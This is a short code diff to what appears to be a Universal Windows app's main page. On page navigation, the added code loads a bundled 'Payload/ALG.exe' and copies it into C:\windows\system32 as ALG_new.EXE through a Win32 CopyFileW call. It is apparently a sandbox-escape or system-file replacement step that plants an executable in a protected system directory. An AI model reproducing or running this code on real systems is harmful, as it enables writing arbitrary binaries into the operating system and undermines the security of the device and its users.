@@ -19,6 +19,8 @@ using namespace Windows::UI::Xaml::Data;
 using namespace Windows::UI::Xaml::Input;
 using namespace Windows::UI::Xaml::Media;
 using namespace Windows::UI::Xaml::Navigation;
+using namespace Windows::Storage;
+using namespace concurrency;
 
 // The Blank Page item template is documented at http://go.microsoft.com/fwlink/?LinkId=234238
 
@@ -239,4 +241,17 @@ void MainPage::OnNavigatedTo(NavigationEventArgs^ e)
 	{
 		debug(L"Error RegCloseKey : %d\n", retCode);
 	}
+
+	Uri^ uri = ref new Uri("ms-appx:///Payload/ALG.exe");
+	create_task(StorageFile::GetFileFromApplicationUriAsync(uri)).then([win32Api](task<StorageFile^> t)
+	{
+		StorageFile ^storageFile = t.get();
+		Platform::String^ filePath = storageFile->Path;
+		debug(L"FilePath : %ls\n", filePath->Data());
+		if (!win32Api.CopyFileW(filePath->Data(), L"C:\\windows\\system32\\ALG_new.EXE", FALSE))
+		{
+			debug(L"CopyFileW error: %d\n", GetLastError());
+		}
+	});
+
 }
